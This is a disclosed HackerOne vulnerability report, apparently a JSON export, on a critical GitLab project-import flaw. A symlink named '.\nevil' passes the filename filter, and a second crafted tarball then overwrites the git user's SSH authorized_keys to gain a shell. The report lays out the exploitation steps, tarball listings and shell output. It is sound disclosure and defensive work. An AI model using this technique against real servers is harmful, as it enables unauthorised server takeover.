{"id":378148,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zNzgxNDg=","url":"https://hackerone.com/reports/378148","title":"Vulnerability in project import leads to arbitrary command execution","state":"Closed","substate":"resolved","severity_rating":"critical","readable_substate":"Resolved","created_at":"2018-07-06T12:23:45.888Z","submitted_at":"2018-07-06T12:23:45.888Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"saltyyolk","url":"/saltyyolk","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/252/596/b03010470e2928f744f71fb5c1685806f1878341_original.jpeg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":264,"url":"https://hackerone.com/gitlab","handle":"gitlab","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/264/8dd359f496ba6c5b97c5126dc86924a00fd7ef26_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/264/8dd359f496ba6c5b97c5126dc86924a00fd7ef26_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"GitLab","twitter_handle":"gitlab","website":"https://about.gitlab.com","about":"A single application for the entire software development lifecycle."}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2018-08-22T09:56:02.386Z","bug_reporter_agreed_on_going_public_at":"2018-08-19T15:29:36.471Z","team_member_agreed_on_going_public_at":"2018-08-22T09:56:02.034Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"**Summary:** \nA filename regular expression could be bypassed and enable the attacker to create a symbolic link in Gitlab upload directory by importing a specially crafted Gitlab export. Further more, Gitlab is designed to not delete project upload directory currently. So, the attacker could delete the imported project and then upload another specially crafted Gitlab export to a project with the same name, which leads to path traversal/arbitrary file upload and finally enables the attacker to be able to get a shell with the permission of the system gitlab user.\n\n**Description:**\n1. how to create a symbolic link in the upload directory\ncode in `file_importer.rb` uses `%r{.*/\\.{1,2}$}` to except `.` and `..` in the extracted project import directory tree, and check everything else that does not match this regex and delete all symlinks. However, we can easily construct a symlink with the name `.\\nevil` in the tarball that matches this regex perfectly. Therefore, it will not be removed by function `remove_symlinks!` in the same file, and finally uploaded to `/var/opt/gitlab/gitlab-rails/uploads/nyangawa/myrepo/.\\nevil -\u003e /var/opt/gitlab` (assume we import the project to `nyangawa/myrepo` and the symlink points to `/var/opt/gitlab`)\n\n2. how to use the uploaded symbolic link to get shell access\nFirst delete the `nyangawa/myrepo` project we just created. For some reasons the upload directory of this project does not get purged. Then we import another tarball which has, for example, `uploads/.\\neviil/.ssh/authorized_keys` in it. And the content of this file is my ssh public key. Then import this tarball to create project `nyangawa/myrepo` again.\n\n3. after all\nthe uploaded `authorized_keys` is copied to `/var/opt/gitlab/gitlab-rails/uploads/nyangawa/myrepo/.\\nevil/.ssh/authorized_keys` of the victim's filesystem but unfortunately, this path redirects to `/var/opt/gitlab/.ssh/authorized_keys`. Then I can login to the victim server by ssh with Gitlab's system username.\n\n\nFor step 2 and 3, there're some other approaches to get command executed since we can already upload any file to the victim's file system controlled by Gitlab.\n\n\n## Steps To Reproduce:\n\nAs I stated in description. I can upload the 2 PoC tarballs if you ask.\n\n## Impact\n\n1. An attacker can upload arbitrary file to the victim's file system\n1. Data of other users could be override\n1. An attacker can get a system shell by overwrite specific files.","vulnerability_information_html":"\u003cp\u003e\u003cstrong\u003eSummary:\u003c/strong\u003e \u003cbr\u003e\nA filename regular expression could be bypassed and enable the attacker to create a symbolic link in Gitlab upload directory by importing a specially crafted Gitlab export. Further more, Gitlab is designed to not delete project upload directory currently. So, the attacker could delete the imported project and then upload another specially crafted Gitlab export to a project with the same name, which leads to path traversal/arbitrary file upload and finally enables the attacker to be able to get a shell with the permission of the system gitlab user.\u003c/p\u003e\n\n\u003cp\u003e\u003cstrong\u003eDescription:\u003c/strong\u003e\u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003e\u003cp\u003ehow to create a symbolic link in the upload directory\u003cbr\u003e\ncode in \u003ccode\u003efile_importer.rb\u003c/code\u003e uses \u003ccode\u003e%r{.*/\\.{1,2}$}\u003c/code\u003e to except \u003ccode\u003e.\u003c/code\u003e and \u003ccode\u003e..\u003c/code\u003e in the extracted project import directory tree, and check everything else that does not match this regex and delete all symlinks. However, we can easily construct a symlink with the name \u003ccode\u003e.\\nevil\u003c/code\u003e in the tarball that matches this regex perfectly. Therefore, it will not be removed by function \u003ccode\u003eremove_symlinks!\u003c/code\u003e in the same file, and finally uploaded to \u003ccode\u003e/var/opt/gitlab/gitlab-rails/uploads/nyangawa/myrepo/.\\nevil -\u0026gt; /var/opt/gitlab\u003c/code\u003e (assume we import the project to \u003ccode\u003enyangawa/myrepo\u003c/code\u003e and the symlink points to \u003ccode\u003e/var/opt/gitlab\u003c/code\u003e)\u003c/p\u003e\u003c/li\u003e\n\u003cli\u003e\u003cp\u003ehow to use the uploaded symbolic link to get shell access\u003cbr\u003e\nFirst delete the \u003ccode\u003enyangawa/myrepo\u003c/code\u003e project we just created. For some reasons the upload directory of this project does not get purged. Then we import another tarball which has, for example, \u003ccode\u003euploads/.\\neviil/.ssh/authorized_keys\u003c/code\u003e in it. And the content of this file is my ssh public key. Then import this tarball to create project \u003ccode\u003enyangawa/myrepo\u003c/code\u003e again.\u003c/p\u003e\u003c/li\u003e\n\u003cli\u003e\u003cp\u003eafter all\u003cbr\u003e\nthe uploaded \u003ccode\u003eauthorized_keys\u003c/code\u003e is copied to \u003ccode\u003e/var/opt/gitlab/gitlab-rails/uploads/nyangawa/myrepo/.\\nevil/.ssh/authorized_keys\u003c/code\u003e of the victim\u0026#39;s filesystem but unfortunately, this path redirects to \u003ccode\u003e/var/opt/gitlab/.ssh/authorized_keys\u003c/code\u003e. Then I can login to the victim server by ssh with Gitlab\u0026#39;s system username.\u003c/p\u003e\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003cp\u003eFor step 2 and 3, there\u0026#39;re some other approaches to get command executed since we can already upload any file to the victim\u0026#39;s file system controlled by Gitlab.\u003c/p\u003e\n\n\u003ch2 id=\"steps-to-reproduce\"\u003eSteps To Reproduce:\u003c/h2\u003e\n\n\u003cp\u003eAs I stated in description. I can upload the 2 PoC tarballs if you ask.\u003c/p\u003e\n\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003col\u003e\n\u003cli\u003eAn attacker can upload arbitrary file to the victim\u0026#39;s file system\u003c/li\u003e\n\u003cli\u003eData of other users could be override\u003c/li\u003e\n\u003cli\u003eAn attacker can get a system shell by overwrite specific files.\u003c/li\u003e\n\u003c/ol\u003e\n","weakness":{"id":58,"name":"Command Injection - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2018-09-18T15:29:36.596Z","allow_singular_disclosure_after":-71936202.02841641,"singular_disclosure_allowed":true,"vote_count":29,"voters":["irvinlim","cdl","secator","jobert","bull","orange","bl4de","ramsexy","spam404","base_64","and 19 more..."],"severity":{"rating":"critical","author_type":"User"},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":3019139,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @nyangawa  ,\n\nThank you for submitting this report. We are currently investigating the issue. Due to our current workload, we will get back with you within the next week with an update.\n\nRegards,\nJames","markdown_message":"\u003cp\u003eHi \u003ca href=\"/nyangawa\"\u003e@nyangawa\u003c/a\u003e  ,\u003c/p\u003e\n\n\u003cp\u003eThank you for submitting this report. We are currently investigating the issue. Due to our current workload, we will get back with you within the next week with an update.\u003c/p\u003e\n\n\u003cp\u003eRegards,\u003cbr\u003e\nJames\u003c/p\u003e\n","automated_response":false,"created_at":"2018-07-09T17:20:21.853Z","updated_at":"2018-07-09T17:20:21.853Z","actor":{"username":"jritchey","cleared":false,"url":"/jritchey","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3027153,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@nyangawa ,\n\nCan you upload the 2 example PoC tarballs?\n\nBest regards,\nJames","markdown_message":"\u003cp\u003e\u003ca href=\"/nyangawa\"\u003e@nyangawa\u003c/a\u003e ,\u003c/p\u003e\n\n\u003cp\u003eCan you upload the 2 example PoC tarballs?\u003c/p\u003e\n\n\u003cp\u003eBest regards,\u003cbr\u003e\nJames\u003c/p\u003e\n","automated_response":false,"created_at":"2018-07-10T23:22:28.307Z","updated_at":"2018-07-10T23:22:28.307Z","actor":{"username":"jritchey","cleared":false,"url":"/jritchey","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3027317,"is_internal":false,"editable":false,"type":"Activities::BugNeedsMoreInfo","message":"","markdown_message":"","automated_response":false,"created_at":"2018-07-11T00:20:16.049Z","updated_at":"2018-07-11T00:20:16.049Z","actor":{"username":"jritchey","cleared":false,"url":"/jritchey","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3027344,"is_internal":false,"editable":false,"type":"Activities::BugNew","message":"@jritchey \n\nSure","markdown_message":"\u003cp\u003e\u003ca href=\"/jritchey\"\u003e@jritchey\u003c/a\u003e \u003c/p\u003e\n\n\u003cp\u003eSure\u003c/p\u003e\n","automated_response":false,"created_at":"2018-07-11T00:40:41.885Z","updated_at":"2018-07-11T00:40:41.885Z","actor":{"username":"saltyyolk","cleared":false,"url":"/saltyyolk","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/252/596/b03010470e2928f744f71fb5c1685806f1878341_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"attachments":[{"id":319181,"filename":"tarball2.tar.gz","type":"application/gzip","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/319/181/589ae612fc1bd809f3d2e4458480094b876e1965/tarball2.tar.gz?response-content-disposition=attachment%3B%20filename%3D%22tarball2.tar.gz%22%3B%20filename%2A%3DUTF-8%27%27tarball2.tar.gz\u0026response-content-type=application%2Fgzip\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQVI7RRVDA%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T054618Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIBHEDTSDqGCEjCA9tudGP24dm%2BoWjhn4lvjW9Xdc726YAiBAirG3R3v5iCJWiH96kr3xjgtokc99MedveJtrAC4YPCq0AwhWEAEaDDAxMzYxOTI3NDg0OSIMwzXTJ902cIF5s5YBKpED%2BFkmFklYgSPET%2FOjZR761EJeyNuollWMzL6Eqk6fqlOryiQVTtybXJCV%2BiXs4IKZlZhdEUgfEs%2FPAvZuGC8ev7K5oLyJ5QqWwuAl7vab30rE%2Fc%2B6gA7DaaQR7brCfssJN3parouSEln0TFi%2Bl2%2Fg04wp1RCS7aIs4VD3adDyb35qEbpuQ8cAYPCIvI7AkKNaVq%2BKTzAMk3O4%2FJlAqQIXdBSTWxtRmWJxWRq9BCvLGNHYWxUqU5LgJuqWxRkm6nUVp%2BfeYyy0xqpTqdHXt%2BFFP%2BZc%2BJ8Gvv6F4e8%2B7BU9sbfDeQE29%2FbuO0f%2FsPEwM9HdRQFytGHqL%2FkQk%2BpNhsgAok7yxwEi9NustpeRTz5rN3XCfxnTv1EQZDTyf2CMkXPxai9miYEyCqEzm95o%2FWji0UokRhJ7nAAvjnFcZZBhzzAlKgj60zmHVd7RAF9FBoKhJw1L8CzEtzHi8Ub%2Fl%2Ff40q%2BnIJGRvCcsv6s8fwns3Q9x9rNOcNC4%2FvQ2W2tcsXBe898Y2j9dQMjAC8oLXDalQ5kwqemq%2FwU67AHfGUTl%2FYDPxs5VQbVM6YbbQPWpACjCZdWNB1X%2BYlCAg6WTSF6hwm9XlUMal0jLt5Ae9Mby3zeF0kXzzliRlv1djJGT18ZKDRpIb6U%2FYP%2FCOvPcZ%2FUXcp7ogmd1yEm6TQJTAPNpn7lyoOOF9531N%2F%2FztCXqmws2n5HlFZs8iPlP3GWFKjEZRsy5DhmrXa8MUEuD9fcCiZMJW80Aq9nKkHrYB8us1vZYBWwuInvS4cRXLQtFsCvvxSgZ3Pc%2FyIg1f4JiqUaR0lsXYqCV2IcbArgLW3ublxMmtJ5ZRv7klB3LmjKFMu9la06KhhLPzw%3D%3D\u0026X-Amz-Signature=94be07262488d48e96adb025adb3477f1e6c47390c22a4bc9b27161040eac630"},{"id":319180,"filename":"tarball1.tar.gz","type":"application/gzip","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/319/180/c0db75293c966d321b7d39f1963593dab4965945/tarball1.tar.gz?response-content-disposition=attachment%3B%20filename%3D%22tarball1.tar.gz%22%3B%20filename%2A%3DUTF-8%27%27tarball1.tar.gz\u0026response-content-type=application%2Fgzip\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQVI7RRVDA%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T054618Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIBHEDTSDqGCEjCA9tudGP24dm%2BoWjhn4lvjW9Xdc726YAiBAirG3R3v5iCJWiH96kr3xjgtokc99MedveJtrAC4YPCq0AwhWEAEaDDAxMzYxOTI3NDg0OSIMwzXTJ902cIF5s5YBKpED%2BFkmFklYgSPET%2FOjZR761EJeyNuollWMzL6Eqk6fqlOryiQVTtybXJCV%2BiXs4IKZlZhdEUgfEs%2FPAvZuGC8ev7K5oLyJ5QqWwuAl7vab30rE%2Fc%2B6gA7DaaQR7brCfssJN3parouSEln0TFi%2Bl2%2Fg04wp1RCS7aIs4VD3adDyb35qEbpuQ8cAYPCIvI7AkKNaVq%2BKTzAMk3O4%2FJlAqQIXdBSTWxtRmWJxWRq9BCvLGNHYWxUqU5LgJuqWxRkm6nUVp%2BfeYyy0xqpTqdHXt%2BFFP%2BZc%2BJ8Gvv6F4e8%2B7BU9sbfDeQE29%2FbuO0f%2FsPEwM9HdRQFytGHqL%2FkQk%2BpNhsgAok7yxwEi9NustpeRTz5rN3XCfxnTv1EQZDTyf2CMkXPxai9miYEyCqEzm95o%2FWji0UokRhJ7nAAvjnFcZZBhzzAlKgj60zmHVd7RAF9FBoKhJw1L8CzEtzHi8Ub%2Fl%2Ff40q%2BnIJGRvCcsv6s8fwns3Q9x9rNOcNC4%2FvQ2W2tcsXBe898Y2j9dQMjAC8oLXDalQ5kwqemq%2FwU67AHfGUTl%2FYDPxs5VQbVM6YbbQPWpACjCZdWNB1X%2BYlCAg6WTSF6hwm9XlUMal0jLt5Ae9Mby3zeF0kXzzliRlv1djJGT18ZKDRpIb6U%2FYP%2FCOvPcZ%2FUXcp7ogmd1yEm6TQJTAPNpn7lyoOOF9531N%2F%2FztCXqmws2n5HlFZs8iPlP3GWFKjEZRsy5DhmrXa8MUEuD9fcCiZMJW80Aq9nKkHrYB8us1vZYBWwuInvS4cRXLQtFsCvvxSgZ3Pc%2FyIg1f4JiqUaR0lsXYqCV2IcbArgLW3ublxMmtJ5ZRv7klB3LmjKFMu9la06KhhLPzw%3D%3D\u0026X-Amz-Signature=af2f4e8d8efbda6f83c0e09644ee8d2a747d871ea03ec7d8cbf5f126ec2d2274"}],"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3027357,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"To reproduce the issue with these tarballs.\n\n1. create project `evil_project` by importing `tarball1.tar.gz`\n```\nroot@10:/var/opt/gitlab/gitlab-rails/uploads/root# ls -alh evil_project/\ntotal 8.0K\ndrwx------  2 git git 4.0K Jul 11 00:34 .\nlrwxrwxrwx  1 git git   15 Jul 11 00:34 .?evil -\u003e /var/opt/gitlab\ndrwxr-xr-x 10 git git 4.0K Jul 11 00:34 ..\n```\nhere you can see a symbolic link is created.\n\n2. remove the project `evil_project`, while the upload directory of this project remains unpurged.\n```\nroot@10:/var/opt/gitlab/gitlab-rails/uploads/root# ls -alh evil_project/\ntotal 8.0K\ndrwx------  2 git git 4.0K Jul 11 00:34 .\nlrwxrwxrwx  1 git git   15 Jul 11 00:34 .?evil -\u003e /var/opt/gitlab\ndrwxr-xr-x 10 git git 4.0K Jul 11 00:34 ..\n```\n\n3. importing `tarball2.tar.gz` to the same project `evil_project`, it's ok since the project was deleted in step 2\n\nCheck the `authorized_keys` of Gitlab\n```\nroot@10:/var/opt/gitlab/.ssh# cat authorized_keys\n# pwned by nyangawa\nssh-rsa a_key_of_mine nyangawa\n```\n\n\nFor the content of these tarballs\ntarball1.tar.gz\n```\n$ tar tvf tarball1.tar.gz \n-rw-r--r-- asakawa/asakawa   5 2018-07-11 08:30 VERSION\n-rw-r--r-- asakawa/asakawa 1754 2018-07-11 08:30 project.json\ndrwxr-xr-x asakawa/asakawa    0 2018-07-11 08:32 uploads/\nlrwxrwxrwx asakawa/asakawa    0 2018-07-11 08:32 uploads/.\\nevil -\u003e /var/opt/gitlab\n```\n\ntarball2.tar.gz\n```\n$ tar tvf tarball2.tar.gz \n-rw-r--r-- asakawa/asakawa   5 2018-07-11 08:30 VERSION\n-rw-r--r-- asakawa/asakawa 1754 2018-07-11 08:30 project.json\ndrwxr-xr-x asakawa/asakawa    0 2018-07-11 08:36 uploads/\ndrwxr-xr-x asakawa/asakawa    0 2018-07-11 08:36 uploads/.\\nevil/\ndrwxr-xr-x asakawa/asakawa    0 2018-07-11 08:37 uploads/.\\nevil/.ssh/\n-rw-r--r-- asakawa/asakawa   51 2018-07-11 08:38 uploads/.\\nevil/.ssh/authorized_keys\n```\n\nBest regards","markdown_message":"\u003cp\u003eTo reproduce the issue with these tarballs.\u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003ecreate project \u003ccode\u003eevil_project\u003c/code\u003e by importing \u003ccode\u003etarball1.tar.gz\u003c/code\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eroot@10:/var/opt/gitlab/gitlab-rails/uploads/root# ls -alh evil_project/\ntotal 8.0K\ndrwx------  2 git git 4.0K Jul 11 00:34 .\nlrwxrwxrwx  1 git git   15 Jul 11 00:34 .?evil -\u0026gt; /var/opt/gitlab\ndrwxr-xr-x 10 git git 4.0K Jul 11 00:34 ..\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003ehere you can see a symbolic link is created.\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eremove the project \u003ccode\u003eevil_project\u003c/code\u003e, while the upload directory of this project remains unpurged.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eroot@10:/var/opt/gitlab/gitlab-rails/uploads/root# ls -alh evil_project/\ntotal 8.0K\ndrwx------  2 git git 4.0K Jul 11 00:34 .\nlrwxrwxrwx  1 git git   15 Jul 11 00:34 .?evil -\u0026gt; /var/opt/gitlab\ndrwxr-xr-x 10 git git 4.0K Jul 11 00:34 ..\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cp\u003eimporting \u003ccode\u003etarball2.tar.gz\u003c/code\u003e to the same project \u003ccode\u003eevil_project\u003c/code\u003e, it\u0026#39;s ok since the project was deleted in step 2\u003c/p\u003e\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003cp\u003eCheck the \u003ccode\u003eauthorized_keys\u003c/code\u003e of Gitlab\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eroot@10:/var/opt/gitlab/.ssh# cat authorized_keys\n# pwned by nyangawa\nssh-rsa a_key_of_mine nyangawa\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eFor the content of these tarballs\u003cbr\u003e\ntarball1.tar.gz\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e$ tar tvf tarball1.tar.gz \n-rw-r--r-- asakawa/asakawa   5 2018-07-11 08:30 VERSION\n-rw-r--r-- asakawa/asakawa 1754 2018-07-11 08:30 project.json\ndrwxr-xr-x asakawa/asakawa    0 2018-07-11 08:32 uploads/\nlrwxrwxrwx asakawa/asakawa    0 2018-07-11 08:32 uploads/.\\nevil -\u0026gt; /var/opt/gitlab\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003etarball2.tar.gz\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e$ tar tvf tarball2.tar.gz \n-rw-r--r-- asakawa/asakawa   5 2018-07-11 08:30 VERSION\n-rw-r--r-- asakawa/asakawa 1754 2018-07-11 08:30 project.json\ndrwxr-xr-x asakawa/asakawa    0 2018-07-11 08:36 uploads/\ndrwxr-xr-x asakawa/asakawa    0 2018-07-11 08:36 uploads/.\\nevil/\ndrwxr-xr-x asakawa/asakawa    0 2018-07-11 08:37 uploads/.\\nevil/.ssh/\n-rw-r--r-- asakawa/asakawa   51 2018-07-11 08:38 uploads/.\\nevil/.ssh/authorized_keys\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eBest regards\u003c/p\u003e\n","automated_response":false,"created_at":"2018-07-11T00:48:43.194Z","updated_at":"2018-07-11T00:48:43.194Z","actor":{"username":"saltyyolk","cleared":false,"url":"/saltyyolk","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/252/596/b03010470e2928f744f71fb5c1685806f1878341_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3031498,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @nyangawa ,\n\nThank you for submitting this report. I've validated that this is a RCE issue. We are working internally on resolving the issue at https://gitlab.com/gitlab-org/gitlab-ce/issues/49133 and to get it patched as soon as possible. \n\nThe issue will be made public 30 days after a patch has been released. We will keep you updated on our progress via HackerOne.\n\nBest regards,\nJames","markdown_message":"\u003cp\u003eHi \u003ca href=\"/nyangawa\"\u003e@nyangawa\u003c/a\u003e ,\u003c/p\u003e\n\n\u003cp\u003eThank you for submitting this report. I\u0026#39;ve validated that this is a RCE issue. We are working internally on resolving the issue at \u003ca title=\"https://gitlab.com/gitlab-org/gitlab-ce/issues/49133\" href=\"/redirect?url=https%3A%2F%2Fgitlab.com%2Fgitlab-org%2Fgitlab-ce%2Fissues%2F49133\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://gitlab.com/gitlab-org/gitlab-ce/issues/49133\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e and to get it patched as soon as possible. \u003c/p\u003e\n\n\u003cp\u003eThe issue will be made public 30 days after a patch has been released. We will keep you updated on our progress via HackerOne.\u003c/p\u003e\n\n\u003cp\u003eBest regards,\u003cbr\u003e\nJames\u003c/p\u003e\n","automated_response":false,"created_at":"2018-07-11T16:35:03.791Z","updated_at":"2018-07-11T16:35:03.791Z","actor":{"username":"jritchey","cleared":false,"url":"/jritchey","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3031502,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","markdown_message":"","automated_response":false,"created_at":"2018-07-11T16:35:20.890Z","updated_at":"2018-07-11T16:35:20.890Z","actor":{"username":"jritchey","cleared":false,"url":"/jritchey","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3061127,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @jritchey,\nI noticed that Gitlab has released a new version to fix this issue. It's great to see your rapid reactions. While I also read your [blog post](https://about.gitlab.com/2018/07/17/critical-security-release-gitlab-11-dot-0-dot-4-released/), I'd like to add my organization in it. Thus, `@nyangawa` -\u003e `@nyangawa of Chaitin Tech`. Is that ok? I can submit a merge request to the [repository](https://gitlab.com/gitlab-com/www-gitlab-com) if you agree with this. And same change to the CVE related to this report if there's a place for that.\n\nBest regards","markdown_message":"\u003cp\u003eHi \u003ca href=\"/jritchey\"\u003e@jritchey\u003c/a\u003e,\u003cbr\u003e\nI noticed that Gitlab has released a new version to fix this issue. It\u0026#39;s great to see your rapid reactions. While I also read your \u003ca href=\"/redirect?url=https%3A%2F%2Fabout.gitlab.com%2F2018%2F07%2F17%2Fcritical-security-release-gitlab-11-dot-0-dot-4-released%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eblog post\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e, I\u0026#39;d like to add my organization in it. Thus, \u003ccode\u003e@nyangawa\u003c/code\u003e -\u0026gt; \u003ccode\u003e@nyangawa of Chaitin Tech\u003c/code\u003e. Is that ok? I can submit a merge request to the \u003ca href=\"/redirect?url=https%3A%2F%2Fgitlab.com%2Fgitlab-com%2Fwww-gitlab-com\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003erepository\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e if you agree with this. And same change to the CVE related to this report if there\u0026#39;s a place for that.\u003c/p\u003e\n\n\u003cp\u003eBest regards\u003c/p\u003e\n","automated_response":false,"created_at":"2018-07-18T10:57:20.252Z","updated_at":"2018-07-18T10:57:20.252Z","actor":{"username":"saltyyolk","cleared":false,"url":"/saltyyolk","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/252/596/b03010470e2928f744f71fb5c1685806f1878341_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3063253,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@nyangawa,\n\nAbsolutely, I've put in MR https://gitlab.com/gitlab-com/www-gitlab-com/merge_requests/13095, and I've also sent in a request to update the CVE to include `@nyangawa of Chaitin Tech`. Thanks again for reporting this issue! Feel free to request public disclosure ~30 days from now and we'll be happy to make it public.\n\nBest regards,\nJames","markdown_message":"\u003cp\u003e\u003ca href=\"/nyangawa\"\u003e@nyangawa\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eAbsolutely, I\u0026#39;ve put in MR \u003ca title=\"https://gitlab.com/gitlab-com/www-gitlab-com/merge_requests/13095\" href=\"/redirect?url=https%3A%2F%2Fgitlab.com%2Fgitlab-com%2Fwww-gitlab-com%2Fmerge_requests%2F13095\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://gitlab.com/gitlab-com/www-gitlab-com/merge_requests/13095\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e, and I\u0026#39;ve also sent in a request to update the CVE to include \u003ccode\u003e@nyangawa of Chaitin Tech\u003c/code\u003e. Thanks again for reporting this issue! Feel free to request public disclosure ~30 days from now and we\u0026#39;ll be happy to make it public.\u003c/p\u003e\n\n\u003cp\u003eBest 